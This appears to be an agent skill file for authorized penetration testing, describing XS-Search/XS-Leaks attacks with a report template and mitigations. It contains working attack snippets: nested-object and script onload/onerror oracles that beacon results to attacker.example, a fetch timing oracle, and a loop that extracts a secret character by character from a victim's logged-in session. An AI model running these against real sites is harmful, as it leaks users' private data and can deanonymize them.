---
name: performing-xs-search-attacks
description: Performing XS-Search / XS-Leaks attacks that extract cross-origin information through side channels — using
  inclusion methods (frames, pop-ups, HTML elements, fetch) and leak techniques (event handlers, timing, error events,
  global limits like connection-pool and event-loop, CORB, postMessage, Performance API) to distinguish two states of a
  victim page and exfiltrate secrets. Activates when assessing cross-origin information disclosure, search endpoints, or
  state-dependent responses.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- xs-search
- xs-leaks
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing XS-Search Attacks

## When to Use

- During authorized assessments where a cross-origin page returns state-dependent responses (search results, auth state, presence of data)
- When a search/filter endpoint reflects whether a query matched (oracle for char-by-char exfiltration)
- When the target lacks framing protection (no XFO/CSP frame-ancestors) or COOP/CORP and can be embedded or popped
- When responses vary by status code, content length, headers, redirects, or processing time
- When evaluating the effectiveness of XS-Leak defenses (SameSite, COOP, CORP, Fetch Metadata, Cache Partitioning)

## Prerequisites

- **Authorization**: Engagement scope covering cross-origin information disclosure and a victim test account
- **Attacker-controlled origin**: A web page you host to deliver the exploit and receive leaked bits
- **Logged-in victim context**: The attack runs in the victim's authenticated browser session
- **A modern browser test matrix**: Chrome and Firefox behave differently for many leaks
- **XSinator**: To enumerate which XS-Leaks the target browser/app is susceptible to

## Critical: Variants Most Often Missed

XS-Search has five moving parts: an Inclusion Method, a Leak Technique, two
States, and a Detectable Difference. Scanners rarely chain them. Test the
matrix below.

```text
# INCLUSION METHODS
HTML elements (img/script/link/object), Frames (iframe/object/embed),
Pop-ups (window.open), JS requests (fetch/XHR)

# LEAK TECHNIQUES (Detectable Difference -> technique)
Status code        -> onload/onerror event handler on script/img/object
Page content       -> iframe onload re-fire via #hash navigation; JS execution leak
Timing             -> performance.now(); unload/beforeunload; sandboxed-frame timing
Global limits      -> connection pool (256 global sockets); per-host pool (6 in Chrome);
                      WebSocket connection limit; Payment Request API (one at a time)
Event loop         -> single-threaded event-loop blocking / busy-loop timing (bypasses Site Isolation)
CORB               -> 2xx + nosniff + protected Content-Type strips body -> infer status+type
ID/name attribute  -> #id focus -> onblur fires if element exists
postMessage        -> missing targetOrigin leaks data, or message presence = oracle
Performance API    -> resource timing entries; Timing-Allow-Origin reveals more
```

Scriptless status-code leak via nested objects:

```html
<object data="//victim.example/secret-endpoint">
  <object data="//attacker.example/?notfound"></object>
</object>
<!-- inner object loads (and beacons) only if the outer resource 404s -->
```

Event-handler status-code oracle from JS:

```html
<script>
const s = document.createElement('script');
s.src = "//victim.example/api/order?id=1337";
s.onload  = () => navigator.sendBeacon("//attacker.example/?state=success");
s.onerror = () => navigator.sendBeacon("//attacker.example/?state=error");
document.body.appendChild(s);
</script>
```

Hash-navigation page-content oracle (no timing needed):

```javascript
// If first load succeeded, changing only the #hash does NOT refire onload.
// If the page errored, onload fires again -> distinguishes the two states.
const f = document.createElement('iframe');
f.src = "//victim.example/search?q=flag#try1";
f.onload = () => { /* count loads; 1 vs >1 distinguishes states */ };
```

### How to CONFIRM a hit (avoid false negatives)

- **Binary oracle works**: send a query you KNOW matches and one you KNOW does not; the chosen signal (beacon, onload count, timing bucket) must reliably differ between them across repeated trials.
- **Timing leaks**: collect many samples per state and compare distributions (e.g., median + spread), not single measurements. Pre-load shared resources to remove network noise; a consistent, statistically separable delta confirms the leak.
- **Global-limit leaks**: the count of thrown exceptions (WebSocket/socket pool) or a queued request's delay maps deterministically to the victim's resource usage — verify by toggling a known victim state.
- **CORB**: confirm the body/headers are stripped for a 2xx + nosniff + protected type while a different status yields observable difference.
- Drive the full exfiltration: chain the oracle to leak a multi-character secret and validate the recovered value end-to-end. A single distinguishable bit that cannot be chained is a weak finding.

## Workflow

### Step 1: Identify a State-Dependent Endpoint
Find a cross-origin response whose status/content/timing depends on a secret or the victim's state (search results, "you have access", presence of a record). Confirm two distinguishable states exist.

### Step 2: Choose an Inclusion Method
```text
- No framing protection -> iframe/object (can read window.frames.length, onload, #id focus)
- Cookie/SameSite blocks framed creds -> window.open pop-up (carries top-level creds in some cases)
- Just need a request fired with creds -> <img>/<script>/<link> or fetch (mode/credentials matter)
```

### Step 3: Select a Leak Technique Matching the Difference
```text
Difference = status code   -> script onload/onerror, scriptless nested <object>
Difference = page content  -> hash-navigation onload re-fire, JS-execution leak
Difference = timing        -> performance.now / unload-beforeunload / sandboxed-frame
Difference = API usage      -> WebSocket limit, Payment Request, postMessage oracle
Difference = global limit  -> connection pool (256 global / 6 per-host), event-loop timing
```

### Step 4: Build the Binary Oracle
```javascript
// Generic timing oracle skeleton
async function probe(url){
  const t0 = performance.now();
  await fetch(url, {mode:'no-cors', credentials:'include'}).catch(()=>{});
  return performance.now() - t0;   // bucket into success/error by threshold
}
```
Force a heavy task on the positive branch (search returning many rows) to widen the timing gap when needed.

### Step 5: Exfiltrate Char-by-Char
```javascript
// Search-based oracle: query "secret starts with X?" for each candidate char
const charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}";
let known = "FLAG{";
for (const c of charset) {
  const matched = await testQuery(`//victim.example/search?q=${known+c}`); // oracle
  if (matched) { known += c; break; }   // repeat outer loop until '}' reached
}
```

### Step 6: Connection-Pool / Event-Loop Timing (defense-resistant)
```text
Connection pool: occupy 255 of 256 global sockets with long-lived requests; use the
256th to load the victim; time a 257th request to a 3rd host -> delay ~ victim load time.
Per-host (Chrome): block 5 of 6 connections to victim origin; the 6th times the page.
Event-loop blocking: time how long the single-threaded loop is unavailable -> infers
cross-origin task duration even under Site Isolation.
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Inclusion Method** | How the victim resource is pulled into the attacker page (frame, pop-up, HTML element, fetch) |
| **Leak Technique** | The side channel used to distinguish states (event handler, timing, global limit, CORB, etc.) |
| **States / Detectable Difference** | The two victim conditions and the observable variation (status, content, header, timing) that separates them |
| **Event-Handler Leak** | `onload`/`onerror` reveal load success/failure -> status-code oracle |
| **Hash-Navigation Leak** | Changing only `#hash` refires `onload` only if the page errored -> content oracle |
| **Connection Pool Leak** | Saturating browser sockets turns a queued request's delay into a timing oracle |
| **Event-Loop Timing** | Blocking/busy single-threaded loop measures cross-origin task time, bypassing Site Isolation |
| **CORB Leak** | 2xx + nosniff + protected Content-Type strips body, leaking status+type combination |
| **postMessage Oracle** | Missing `targetOrigin` leaks data; message presence signals victim state |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **XSinator** | Automatically test a browser/app against many known XS-Leaks |
| **xsleaks.dev knowledge base** | Reference catalog of inclusion methods, leak techniques, and defenses |
| **HTTPLeaks (cure53)** | Enumerate HTML elements that force cross-origin resource requests |
| **performance.now() / Resource Timing API** | High-resolution timing measurement for timing leaks |
| **SharedArrayBuffer / Broadcast/Message Channel** | Implicit clocks when `performance.now` precision is reduced |
| **Attacker-hosted page + beacon endpoint** | Deliver the exploit and collect leaked bits |

## Common Scenarios

### Scenario 1: Search Endpoint Char-by-Char Leak
A logged-in user's private search at `/search?q=` returns a different response size when a query matches. The attacker page frames the search with successive prefixes and uses an onload/timing oracle to reconstruct private data one character at a time.

### Scenario 2: Auth-State Detection via Status Code
`/account/billing` returns 200 for logged-in users and 302/403 otherwise. A cross-origin `<script onload/onerror>` oracle reveals whether the visitor is authenticated to the target — useful for deanonymization.

### Scenario 3: Connection-Pool Timing Under Site Isolation
Framing protections and Site Isolation block direct reads, so the attacker saturates the browser socket pool and times a queued request to infer how long the victim's state-dependent page took to load, distinguishing the two states.

## Output Format

```
## XS-Search / XS-Leak Finding

**Vulnerability**: Cross-Origin Information Disclosure via XS-Search
**Severity**: Medium-High (CVSS 6.5)
**Location**: GET /search?q= (cross-origin, credentialed)
**OWASP Category**: A01:2021 - Broken Access Control (cross-origin info disclosure)

### Reproduction Steps
1. Host attacker page that frames https://victim.example/search?q=<prefix>
2. Use onload-count (hash navigation) oracle to detect match vs no-match per prefix
3. Iterate the charset to extend the known prefix one character at a time
4. Recover the private value FLAG{...} from the victim's authenticated session

### Oracle Evidence
| Inclusion | Leak technique | State A (match) | State B (no match) |
|-----------|----------------|-----------------|--------------------|
| iframe + #hash | onload re-fire | onload fires once | onload fires twice |

### Impact
An attacker page visited by a logged-in victim can extract private,
account-scoped data cross-origin without any same-origin access.

### Recommendation
1. Set SameSite=Lax/Strict on session cookies so credentialed cross-site requests are blocked
2. Deploy Cross-Origin-Opener-Policy and Cross-Origin-Resource-Policy
3. Add framing protection (X-Frame-Options / CSP frame-ancestors)
4. Adopt Fetch Metadata (Sec-Fetch-*) to reject unexpected cross-site requests
5. Normalize response size/timing/status for state-dependent endpoints; add per-user CSRF-style tokens to search
```
